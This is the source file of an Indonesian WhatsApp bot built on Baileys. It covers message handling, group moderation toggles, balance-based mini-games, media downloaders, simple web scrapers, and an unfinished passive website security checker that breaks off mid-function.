require('./config')
require('./menu2')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const BodyForm = require('form-data')
const yts = require('yt-search')
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const { fromBuffer } = require('file-type')
const chalk = require('chalk')
const { v4: uuidv4 } = require('uuid')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const FormData = require('form-data');
const users = {};
const emojiRegex = /\p{Emoji}/u;
const notes = {}; // Objek untuk menyimpan catatan pengguna
const pasienSakit = {};

const obatTersedia = ['Paracetamol', 'Antibiotik', 'Vitamin C', 'Obat Pusing'];
const obatDokter = {};
const StickerXeon = JSON.parse(fs.readFileSync('./database/xeonsticker.json'))
const os = require('os')
const fetch = require('node-fetch');
const cheerio = require('cheerio');
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
let { Image } = require('node-webpmux')
const { smims } = require('./lib/uploadImage')
const crypto = require('crypto');
const caseCount = {};
const Jimp = require('jimp');
const photooxy = require('./lib/photooxy');
const { webp2mp4File } = require('./lib/uploader')
const { mediafireDl } = require('./lib/mediafire.js')
const { fetchBuffer, GIFBufferToVideoBuffer, buffergif, pickRandom } = require("./lib/myfunc2")
const speed = require('performance-now')

const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const textpro = require('./scrape/textpro')
const { color, bgcolor } = require('./lib/color')
const anon = require('./lib/menfess')
const ytdl = require('ytdl-core')
const { addExif } = require('./lib/exif')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, fetchJson, getBuffer, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakbendera = db.data.game.tebakbendera = []
let menfes = db.data.game.menfes = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let isGameActive = false;
let isactiveFishingGames = false;
let players = null; // Daftar ID pemain dalam permainan
let impostorId = null; //ID
let secretWord = null; // Kata yang akan ditebak
let tagCount = {}; // Menyimpan jumlah tag yang telah dikirim
let tagQueue = {}; // Menyimpan antrian tag untuk setiap 
const activeGames = {};
let requiredClaps = 0;
const activeFishingGames = {};
let players1 = {};
let totalClaps = 0;
let keyQuest = {};
let conversationState = null;
let kirimpesan = true;
let registeredUsers = {};
let gameInProgress = false;
let playerAlive = true;
let intervalID
let spamCounter = {};
const adventures = [
    "Anda menemukan gua yang misterius. Apakah Anda akan masuk? (ya/tidak)",
    "Anda bertemu monster di hutan. Apakah Anda akan melawan? (ya/tidak)",
    "Anda menemukan harta karun yang tersembunyi. Apakah Anda akan mengambilnya? (ya/tidak)"
];
const chatURL = 'https://beta.character.ai/chat2?char=-p04V7wg7AT5CcJumGnEB2LVWdjvuJEfVjs1P3LOSwo';  

const results = [
    "Selamat! Anda berhasil menemukan harta yang berlimpah.",
    "Sayang sekali, Anda kalah dalam pertarungan melawan monster.",
    "Anda mendapat kutukan setelah mengambil harta karun. Sebaiknya hati-hati."
];

//DB
let { pinterest } = require('./lib/scraper');

function safeReadJSON(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error(`Error parsing JSON from ${filePath}:`, error.message);
    return {}; // Kembalikan objek kosong sebagai fallback
  }
}
let autosticker = safeReadJSON('./database/autosticker.json');
let ntvirtex = safeReadJSON('./database/antivirus.json');
let nttoxic = safeReadJSON('./database/antitoxic.json');
let ntwame = safeReadJSON('./database/antiwame.json');
let welcome = safeReadJSON("./database/welcome.json");
let ntlinkgc = safeReadJSON('./database/antilinkgc.json');
let ntlinkall = safeReadJSON('./database/antilinkall.json');
let ntibatu = safeReadJSON('./database/antibatu.json');
let ntiemoji = safeReadJSON('./database/antiemoji.json');
let simion = safeReadJSON('./database/simion.json');
let bacat = safeReadJSON('./database/bacat.json');
let ntilinktwt = safeReadJSON('./database/antilinktwitter.json');
let owner = safeReadJSON('./database/owner.json');
let ntilinktt = safeReadJSON('./database/antilinktiktok.json');
let ntilinktg = safeReadJSON('./database/antilinktelegram.json');
let ntilinkfb = safeReadJSON('./database/antilinkfacebook.json');
let akinator = safeReadJSON('./src/akinator.json');
let ntilinkig = safeReadJSON('./database/antilinkinstagram.json');
let ntilinkyt = safeReadJSON('./database/antilinkyt.json');
const banned = safeReadJSON('./database/banned.json');
const prem = safeReadJSON('./database/premium.json');
module.exports = sky = async (sky, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        global.prefix = prefix
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()        
        var args = body.trim().split(/ +/).slice(1)
        var args1 = body.trim().split(/ +/).slice(1)
        args = args.concat(['','','','','',''])
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./sky.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        const pushname = m.pushName || "No Name"
        const botNumber = await sky.decodeJid(sky.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ").trim()
        const isGroup = from.endsWith("@g.us");        
        const isBan = banned.includes(m.sender)
        const xeonymisc = (m.quoted || m)
        const quoted = (xeonymisc.mtype == 'buttonsMessage') ? xeonymisc[Object.keys(xeonymisc)[1]] : (xeonymisc.mtype == 'templateMessage') ? xeonymisc.hydratedTemplate[Object.keys(xeonymisc.hydratedTemplate)[1]] : (xeonymisc.mtype == 'product') ? xeonymisc[Object.keys(xeonymisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const mentionByTag = m.sender
        const mentionByReply = m.sender
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const isMedia = /image|video|sticker|audio/.test(mime)
//GROUP
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYt = m.isGroup ? ntilinkyt.includes(from) : false
        const AntiBatu = m.isGroup ? ntibatu.includes(from) : false
        const antiEmote = m.isGroup ? ntiemoji.includes(from) : false
        const SimiActive = m.isGroup ? simion.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const bocet = m.isGroup ? bacat.includes(from) : false
        const antilinkinstagram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const isWelcome = m.isGroup ? welcome.includes(m.chat) : false;
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntlinkall.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false      
        // Group
const groupMetadata = m?.isGroup ? await sky.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
        const isPrem = prem.includes(m.sender)
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let BalanceUser = isPremium ? global.balanceawal.premium : global.balanceawal.free
            let user = db.data.users[m.sender];
if (typeof user !== 'object') db.data.users[m.sender] = {};
if (user) {    
    if (!isNumber(user.limit)) user.limit = limitUser;
    if (!isNumber(user.balance)) user.balance = BalanceUser;
    if (!isNumber(user.gold)) user.gold = 0;
    if (!isNumber(user.silver)) user.silver = 0;
    if (!isNumber(user.emerald)) user.emerald = 0;
    if (!isNumber(user.potion)) user.potion = 0;
} else {
    global.db.data.users[m.sender] = {
        afkTime: -1,
        afkReason: '',
        limit: limitUser,
        balance: BalanceUser,
        gold: 0,
        silver: 0,
        emerald: 0,
        potion: 0,
        premium: false
    };
} 
const getTime = () => moment().tz('Asia/Jakarta').format('HH:mm:ss');

// Fungsi untuk mewarnai teks secara bergantian dengan warna lembut
const rainbowText = (text) => {
    const colors = [chalk.red, chalk.green, chalk.yellow, chalk.blue, chalk.magenta, chalk.cyan];
    return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
};

// Fungsi untuk menentukan apakah pesan berasal dari grup atau chat pribadi
const getChatType = (isGroup) => isGroup ? chalk.greenBright('Group Chat') : chalk.blueBright('Private Chat');

// Fungsi untuk memformat baris dengan rapi
const formatLine = (label, value) => {
    return `${chalk.bold(label.padEnd(10))}: ${chalk.whiteBright(value)}`;
};

// Header dan Footer yang minimalis
const headerLine = (title) => chalk.bold.blue(`\n[ ${title} ]`);
const footerLine = () => chalk.grey('\n----------------------------------------');

// Daftar jenis pesan yang hanya berupa teks
const textMessageTypes = ['conversation', 'extendedTextMessage'];

if (m.message) {
    // Periksa apakah tipe pesan adalah teks
    if (textMessageTypes.includes(m.mtype)) {
        sky.readMessages([m.key]);

        console.log(headerLine('Incoming Message'));
        console.log(formatLine('Time', getTime()));
        console.log(formatLine('Message', budy || m.mtype));
        console.log(formatLine('Sender', m.sender));
        console.log(formatLine('Chat Type', getChatType(m.isGroup)));
        console.log(footerLine());
    }
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')


        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antiviewonce' in chats)) chats.antiviewonce = false
                if (!('antipoll' in chats)) chats.antipoll = false     
                if (!('antichat' in chats)) antichat = false               
                if (!('antimedia' in chats)) chats.antimedia = false        
                if (!('antievent' in chats)) chats.antievent = false  
                if (!('anticallog' in chats)) chats.anticallog = false
                if (!('antipushkontakv1' in chats)) chats.antivirtex = true
                if (!('antipushkontakv2' in chats)) chats.antivirtex = true
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antiviewonce: false,
                antipoll: false,
                antichat: false,
                antievent: false,
                anticallog: false,
                antiemedia: false,
                antipushkontakv1: false,
                antipushkontakv2: false,
            }
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = true
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
    	    anticall: true,
    		status: 0,
    		autobio: false
	    }
	    
        } catch (err) {
            console.error(err)
        }
	      const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${botname},;;;\nFN:${botname}\nitem1.TEL;waid=${owner}:+${owner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
        const ftroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: "avosky", sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        
 if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}
//SENDBUTTON
function runtime(seconds) {
    // Konversi input ke tipe Number
    seconds = Number(seconds);

    // Hitung hari, jam, menit, dan detik
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);

    // Format tampilan untuk hari, jam, menit, dan detik
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";

    // Gabungkan dan kembalikan hasil
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
function sendButton(chatId, text, buttonText, buttonId) {
    let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    
    let msg = generateWAMessageFromContent(chatId, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: text
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `© avosky`
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"${buttonText}","id":"${buttonId}"}`
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    sky.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
async function processing(urlPath, method) {
    return new Promise(async (resolve, reject) => {
        let Methods = ["enhance", "recolor", "dehaze"];
        Methods.includes(method) ? (method = method) : (method = Methods[0]);
        let buffer,
            Form = new FormData(),
            scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
        Form.append("model_version", 1, {
            "Content-Transfer-Encoding": "binary",
            contentType: "multipart/form-data; charset=uttf-8",
        });
        Form.append("image", Buffer.from(urlPath), {
            filename: "enhance_image_body.jpg",
            contentType: "image/jpeg",
        });
        Form.submit(
            {
                url: scheme,
                host: "inferenceengine" + ".vyro" + ".ai",
                path: "/" + method,
                protocol: "https:",
                headers: {
                    "User-Agent": "okhttp/4.9.3",
                    Connection: "Keep-Alive",
                    "Accept-Encoding": "gzip",
                },
            },
            function (err, res) {
                if (err) reject();
                let data = [];
                res
                    .on("data", function (chunk, resp) {
                        data.push(chunk);
                    })
                    .on("end", () => {
                        resolve(Buffer.concat(data));
                    });
                res.on("error", (e) => {
                    reject();
                });
            }
        );
    });
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
//
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        // Public & Self
        if (!sky.public) {
            if (!m.key.fromMe) return
        } 
        const downloadMp3 = async (Link) => {

try {

await ytdl.getInfo(Link)

let mp3File = getRandom('.mp3')

console.log(color('Download Audio With ytdl-core'))

ytdl(Link, { filter: 'audioonly' })

.pipe(fs.createWriteStream(mp3File))

.on('finish', async () => {

await sky.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })

fs.unlinkSync(mp3File)

})

} catch (err) {

m.reply(`${err}`)

}

}
        const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await sky.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
 //yaaa
 if(budy.includes('@628386484120')) {
m.reply('Nyariin dia?')
}
//gif
async function sendGif(url, chatId, caption) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, "utf-8");
        const fetchedgif = await GIFBufferToVideoBuffer(buffer);

        await sky.sendMessage(chatId, { video: fetchedgif, gifPlayback: true }, { quoted: m, caption: caption });
    } catch (error) {
        console.log(error);
    }
}

function sendLiveLocation(to, locationData, duration, options = {}) {
    const msg = {
        location: locationData,
        liveLocation: true,
        liveDuration: duration
    };
    sky.sendMessage(to, msg, options);
}

function sendOTP(number) {
  const otp = Math.floor(1000 + Math.random() * 9000);
  registeredUsers[number] = { otp };
    sky.sendText(sender, `OTP untuk ${number}: ${otp}`);
}
// FUNCTION PETAK BOMB
let pilih = "✅", bomb = "☠️";
if (sender in petakbom) {
  let userBalance = db.data.users[sender].balance || 0; // Ambil saldo pengguna dari database
  if (userBalance < 1000) {
    m.reply('Maaf, saldo Anda di bawah 1000 Anda tidak dapat main.');
    return;
  }

  if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
  if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
  if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
    petakbom[sender].board[parseInt(body) - 1] = bomb;
    petakbom[sender].pick++;
    sky.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
    petakbom[sender].bomb--;
    petakbom[sender].nyawa.pop();

    let brd = petakbom[sender].board;
    if (petakbom[sender].nyawa.length < 1) {
      await m.reply(`_GAME TELAH BERAKHIR_\n_Kamu terkena bomb_\n\n ${brd.join("")}\n\n_Terpilih :_ ${petakbom[sender].pick}\n_Pengurangan Saldo :_ Rp. 100`);
      sky.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
      db.data.users[sender].balance -= 1000; // Mengurangi saldo pengguna sebesar 1000
      delete petakbom[sender];
    } else await m.reply(`_PILIH ANGKA_\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
    return !0;
  }
  if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
    petakbom[sender].petak[parseInt(body) - 1] = 1;
    petakbom[sender].board[parseInt(body) - 1] = pilih;
    petakbom[sender].pick++;
    petakbom[sender].lolos--;
    let brd = petakbom[sender].board;
    if (petakbom[sender].lolos < 1) {
      await m.reply(`_Mantap_\n\n${brd.join("")}\n\n_Terpilih :_ ${petakbom[sender].pick}\n_Sisa nyawa :_ ${petakbom[sender].nyawa}\n_Bomb :_ ${petakbom[sender].bomb}\n_Hadiah Saldo :_ Rp. 250`);
      sky.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
      db.data.users[sender].balance += 1000; // Menambah saldo pengguna sebesar 1000
      delete petakbom[sender];
    } else m.reply(`_PILIH ANGKA_\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
  }
}
// FUNGSI UNTUK GAME KEY QUEST
let keys = ["🔑", "🗝️", "🔒", "🔓", "🚪"]; // Emoji untuk kunci misteri, termasuk tantangan
if (sender in keyQuest) {
  let userBalance = db.data.users[sender].balance || 0;
  if (userBalance < 1000) {
    m.reply('Maaf, saldo Anda di bawah 1000. Anda tidak dapat main.');
    return;
  }

  if (!/^[1-5]$/i.test(body) && !isCmd) return !0;
  if (keyQuest[sender].keys[parseInt(body) - 1] === 1) return !0;

  if (keyQuest[sender].keys[parseInt(body) - 1] === 0) {
    keyQuest[sender].keys[parseInt(body) - 1] = 1;
    let reward = keys[Math.floor(Math.random() * keys.length)];
    keyQuest[sender].board[parseInt(body) - 1] = reward;
    keyQuest[sender].pick++;

    if (reward === "🚪") {
      delete keyQuest[sender];
      db.data.users[sender].balance -= 5000;
      await m.reply(`Anda memilih kunci tantangan! Permainan berakhir. Maaf, Anda kehilangan Rp. 5000.`);
      return;
    } else {
      let prize = calculatePrize(reward);
      db.data.users[sender].balance += prize;
      await m.reply(`Anda memilih kunci misteri!\n\n${keyQuest[sender].board.join(" ")}\n\nTerpilih: ${reward}\n\nSelamat! Anda mendapatkan Rp. ${prize}.`);
    }
  }
}

// Fungsi untuk menghitung hadiah berdasarkan kunci yang dipilih
function calculatePrize(reward) {
  switch (reward) {
    case "🔑":
      return 2000;
    case "🗝️":
      return 3000;
    case "🔒":
      return 1000;
    case "🔓":
      return 500;
    default:
      return 0;
  }
}
/// FUNCTION PETAK MYSTERY
let mystery = ["💰", "🎁", "🎲", "❓", "👎"]; // Emoji untuk hadiah misteri, termasuk zonk
if (sender in petakmystery) {
  // Cek saldo pengguna sebelum memulai permainan
  let userBalance = db.data.users[sender].balance || 0;
  if (userBalance < 1000) {
    m.reply('Maaf, saldo Anda di bawah 1000 Anda tidak dapat main.');
    return;
  }

  if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
  if (petakmystery[sender].petak[parseInt(body) - 1] === 1) return !0;

  // Jika pemain memilih petak yang berisi hadiah misteri atau zonk
  if (petakmystery[sender].petak[parseInt(body) - 1] === 0) {
    petakmystery[sender].petak[parseInt(body) - 1] = 1;
    let reward = mystery[Math.floor(Math.random() * mystery.length)];
    petakmystery[sender].board[parseInt(body) - 1] = reward;
    petakmystery[sender].pick++;

    // Jika pemain mendapatkan zonk
    if (reward === "👎") {
      delete petakmystery[sender]; // Menghapus data permainan
      db.data.users[sender].balance -= 10000; // Kurangi saldo pengguna sebesar 10000
      await m.reply(`Anda memilih petak zonk! Permainan berakhir. Maaf, Anda kehilangan Rp. 10000.`);
      return;
    } else {
      db.data.users[sender].balance += 2500; // Tambahkan saldo pengguna sebesar 10000
      await m.reply(`Anda memilih petak misteri!\n\n${petakmystery[sender].board.join("")}\n\nTerpilih: ${reward}\n\nSelamat! Anda mendapatkan Rp. 2500.`);
    }
  }
}
// FUNCTION PETAK TEKA-TEKI
let pilih4 = "✅", hadiah = "🎁";
if (sender in petakteka) {
  let userBalance = db.data.users[sender].balance || 0; // Ambil saldo pengguna dari database
  if (userBalance < 1000) {
    m.reply('Maaf, saldo Anda di bawah 1000. Anda tidak dapat bermain.');
    return;
  }

  if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
  if (petakteka[sender].petak[parseInt(body) - 1] === 1) return !0;
  if (petakteka[sender].petak[parseInt(body) - 1] === 2) {
    petakteka[sender].board[parseInt(body) - 1] = hadiah;
    petakteka[sender].pick++;
    sky.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
    petakteka[sender].nyawa--;

    let brd = petakteka[sender].board;
    if (petakteka[sender].nyawa < 1) {
      await m.reply(`_GAME OVER_\n_Kamu mendapatkan hadiah_\n\n ${brd.join("")}\n\n_Terpilih :_ ${petakteka[sender].pick}\n_Pengurangan Saldo :_ Rp. 100`);
      sky.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
      db.data.users[sender].balance -= 1000; // Mengurangi saldo pengguna sebesar 1000
      delete petakteka[sender];
    } else await m.reply(`_PILIH ANGKA_\n\nKamu mendapatkan hadiah\n ${brd.join("")}\n\nSisa nyawa: ${petakteka[sender].nyawa}`);
    return !0;
  }
  if (petakteka[sender].petak[parseInt(body) - 1] === 0) {
    petakteka[sender].petak[parseInt(body) - 1] = 1;
    petakteka[sender].board[parseInt(body) - 1] = pilih4;
    petakteka[sender].pick++;
    let brd = petakteka[sender].board;
    await m.reply(`_PILIH ANGKA_\n\n${brd.join("")}\n\nTerpilih : ${petakteka[sender].pick}\nSisa nyawa : ${petakteka[sender].nyawa}`);
  }
}
        
//ADDG
async function jarak(from, to) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + from + ' to ' + to)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}
async function loading () {
var hawemod = [
"🟨🟨🟨🟨🟨🟨🟨🟨",
"🟨🟦🟦🔲🔲🟦🟦🟨",
"🏽🏽🏽🏽🏽🏽🏽🏽",
"🏽⬜🟦🏽🏽🟦⬜🏽",
"🏽🏽🏽🏽🏽🏽🏽🏽",
"🏽🏽🟫🏽🏽🟫🏽🏽",
"🏽🏽🟫🟫🟫🟫🏽🏽",
"NARUTO",
]
let { key } = await sky.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await sky.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
}
}
async function skysend(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await sky.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
async function getLatestAnime() {
  try {
    const response = await axios.get('https://myanimelist.net/anime/season');
    const $ = cheerio.load(response.data);
    
    const animeList = [];
    
    $('div.seasonal-anime').each((index, element) => {
      const title = $(element).find('div.title-text').text().trim();
      const link = $(element).find('div.title-text a').attr('href');
      
      if (title && link) {
        animeList.push({ title, link });
      }
    });
    
    return animeList;
  } catch (error) {
    console.error('Error fetching latest anime:', error);
    return [];
  }
}
let list = []
for (let i of owner) {
list.push({
	    	displayName: await sky.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await sky.getName(i)}\nFN:${await sky.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
async function getLatestBBCNews() {
  try {
    const response = await axios.get('https://www.bbc.co.uk/news');
    const $ = cheerio.load(response.data);
    
    const news = [];
    
    $('div.gs-c-promo').each((index, element) => {
      const title = $(element).find('h3').text();
      const link = $(element).find('a').attr('href');
      
      if (title && link) {
        news.push({ title, link });
      }
    });
    
    return news;
  } catch (error) {
    console.error('Error fetching BBC news:', error);
    return [];
  }
}
async function performAdvancedBugHunting(url) {
    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);

        const headers = response.headers;
        const status = response.status;
        const contentType = headers['content-type'];

        // Check for insecure HTTP resources
        const insecureResources = [];
        $('*[src^="http://"]').each((index, element) => {
            insecureResources.push($(element).attr('src'));
        });

        // Check for forms without secure attribute
        const formsWithoutSecure = $('form:not([method="post"])');

        // More vulnerability checks can be added here

